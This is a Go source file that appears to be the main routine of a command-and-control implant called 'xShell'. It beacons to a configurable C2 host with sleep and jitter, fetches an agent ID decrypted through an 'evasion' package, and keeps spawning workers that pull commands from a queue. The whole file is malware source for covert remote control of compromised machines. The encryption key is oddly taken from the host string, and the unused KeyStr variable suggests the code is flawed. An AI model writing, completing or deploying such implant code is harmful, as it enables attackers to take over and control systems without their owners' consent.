package main

import (
	"fmt"
	"io"
	"os"
	"time"
	"xShell/payload/evasion"
	"xShell/payload/internal"
)

var KeyStr string = ""
var C2Host string = ""

func main() {
	internal.HttpLink.Host = C2Host
	internal.HttpLink.Key = []byte(C2Host)
	id, err := getId()
	if err != nil {
		os.Exit(0)
	}
	internal.HttpLink.Id = id
	beacon := internal.Beacon{
		Sleep:    15,
		Jitter:   10,
		HttpLink: &internal.HttpLink,
		Rqueue:   &internal.RequestQueue,
		Cqueue:   &internal.CommandQueue,
	}
	go beacon.Run()
	for {
		time.Sleep(1 * time.Second)
		if len(internal.Workers) <= 0 {
			worker := newWorkerObj()
			internal.AddWorker(worker)
		}
	}
}

func getId() (string, error) {
	idReq, err := internal.HttpLink.NewIdRequest()
	if err != nil {
		return "", err
	}
	resp, err := internal.SendRequest(idReq)
	if err != nil {
		return "", err
	}
	if resp.Body == nil {
		return "", fmt.Errorf("error getting id")
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	decrypt, err := evasion.SerpentDecrypt(body, internal.HttpLink.Key)
	if err != nil {
		return "", err
	}
	return string(decrypt), nil
}

func newWorkerObj() *internal.Worker {
	worker := internal.Worker{
		Sleep:  5,
		Link:   &internal.HttpLink,
		Rqueue: &internal.RequestQueue,
		Cqueue: &internal.CommandQueue,
	}
	return &worker
}
